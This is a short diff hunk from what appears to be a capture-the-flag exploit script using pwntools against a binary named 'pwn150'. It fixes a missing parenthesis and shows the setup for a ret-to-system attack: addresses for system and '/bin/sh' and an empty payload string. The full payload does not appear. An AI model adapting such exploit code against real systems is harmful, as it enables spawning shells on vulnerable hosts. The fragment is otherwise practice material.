@@ -9,7 +9,7 @@ local = True
 if local: p = process("./pwn150")
 else: p = remote("127.0.0.1", 5253)
 
-system = p64(0x40075f
+system = p64(0x40075f)
 binsh = p64(0x4003ef)
 
 payload = ""
